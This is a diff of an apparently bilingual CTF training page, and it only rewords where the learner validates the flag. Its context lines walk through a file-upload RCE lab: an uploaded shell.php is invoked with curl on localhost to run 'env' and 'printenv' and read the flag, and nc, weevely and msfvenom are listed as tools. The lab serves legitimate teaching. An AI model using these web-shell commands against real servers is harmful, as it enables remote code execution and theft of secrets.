@@ -12,7 +12,7 @@
       <li data-i18n="upload_obj_2">Accede a ella en /uploads/&lt;archivo&gt;?cmd=id para confirmar el RCE.</li>
       <li data-i18n="upload_obj_3">Vuelca el entorno del proceso para leer la flag: ?cmd=env o ?cmd=printenv+HL_FLAG.</li>
     </ol>
-    <p class="text-xs text-gray-400 mt-3"><i class="ph ph-flag text-green-500"></i> <strong class="text-green-500" data-i18n="upload_obj_flag_lbl">Flag:</strong> <code>HL{···}</code> <span data-i18n="upload_obj_flag_hint">— valídala en la barra lateral.</span></p>
+    <p class="text-xs text-gray-400 mt-3"><i class="ph ph-flag text-green-500"></i> <strong class="text-green-500" data-i18n="upload_obj_flag_lbl">Flag:</strong> <code>HL{···}</code> <span data-i18n="upload_obj_flag_hint">— valídala en la caja «Validar Flag» al final de esta página.</span></p>
   </div>
 
   <div class="hl-card mb-4">
@@ -193,7 +193,7 @@ cp shell.php shell.php.jpg</pre>
     <pre>curl "http://localhost:5000/uploads/shell.php?cmd=env" | grep HL_FLAG
 # o directamente
 curl "http://localhost:5000/uploads/shell.php?cmd=printenv+HL_FLAG"</pre>
-    <p>Flag: <code>HL{···}</code>. Valídala en la barra lateral.</p>
+    <p>Flag: <code>HL{···}</code>. Valídala en la caja «Validar Flag» al final de esta página.</p>
 
     <h3>Herramientas</h3>
     <div><span class="tools-badge">curl</span> <span class="tools-badge">nc</span> <span class="tools-badge">weevely</span> <span class="tools-badge">Burp Suite</span> <span class="tools-badge">msfvenom</span></div>
@@ -270,7 +270,7 @@ cp shell.php shell.php.jpg</pre>
     <pre>curl "http://localhost:5000/uploads/shell.php?cmd=env" | grep HL_FLAG
 # or directly
 curl "http://localhost:5000/uploads/shell.php?cmd=printenv+HL_FLAG"</pre>
-    <p>Flag: <code>HL{···}</code>. Validate it in the sidebar.</p>
+    <p>Flag: <code>HL{···}</code>. Validate it in the "Validate Flag" box at the bottom of this page.</p>
 
     <h3>Tools</h3>
     <div><span class="tools-badge">curl</span> <span class="tools-badge">nc</span> <span class="tools-badge">weevely</span> <span class="tools-badge">Burp Suite</span> <span class="tools-badge">msfvenom</span></div>
